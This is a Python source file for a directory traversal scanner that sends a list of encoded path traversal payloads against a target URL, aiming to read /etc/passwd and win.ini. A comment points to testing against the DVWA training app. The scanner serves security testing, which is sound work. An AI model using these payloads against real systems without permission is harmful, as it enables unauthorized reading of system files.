import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def run_dir_traversal_scan(target_url: str, cookies: dict = None) -> dict:
    payloads = [
        "../../../../../../../../etc/passwd",
        "../../../../../../../../windows/win.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "....//....//....//....//etc/passwd",
        "../../../../../../../../etc/passwd%00",
        "../../../../../../../../windows/win.ini%00.png",
        "/etc/passwd",
        "C:\\windows\\win.ini"
    ]
    
    details = []
    
    # Fix: If testing DVWA (?page=), don't append a slash
    if "?" in target_url:
        base_url = target_url
    else:
        base_url = target_url if target_url.endswith('/') else f"{target_url}/"

    for payload in payloads:
        test_url = base_url + payload
        
        try:
            response = requests.get(test_url, timeout=5, verify=False, cookies=cookies)
            
            if "root:x:0:0" in response.text or "[extensions]" in response.text:
                details.append({
                    "type": "Directory Traversal",
                    "payload_used": payload,
                    "severity": "High",
                    "description": f"Successfully read local system files using this path traversal payload."
                })
                break 
                
        except requests.RequestException:
            continue

    return {
        "scanner_name": "Advanced Directory Traversal Scanner",
        "target_url": target_url,
        "vulnerabilities_found": len(details),
        "details": details
    }